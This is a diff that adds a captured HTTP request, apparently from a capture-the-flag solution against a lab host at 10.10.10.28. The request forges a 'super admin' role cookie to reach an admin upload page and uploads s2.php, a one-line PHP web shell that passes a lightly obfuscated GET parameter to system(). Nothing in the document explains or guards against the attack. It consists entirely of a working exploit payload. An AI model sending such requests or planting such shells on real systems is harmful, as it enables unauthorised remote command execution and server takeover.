@@ -1,0 +1,24 @@
+POST /cdn-cgi/login/admin.php?content=uploads&action=upload HTTP/1.1
+Host: 10.10.10.28
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------6712757784251355494793847720
+Content-Length: 401
+Origin: http://10.10.10.28
+Connection: close
+Referer: http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads
+Cookie: user=86575; role=super admin
+Upgrade-Insecure-Requests: 1
+
+-----------------------------6712757784251355494793847720
+Content-Disposition: form-data; name="name"
+
+s2.php
+-----------------------------6712757784251355494793847720
+Content-Disposition: form-data; name="fileToUpload"; filename="s2.php"
+Content-Type: application/x-php
+
+<?php $c=chr(99);if(isset($_GET[$c]))system($_GET[$c]); ?>
+-----------------------------6712757784251355494793847720--
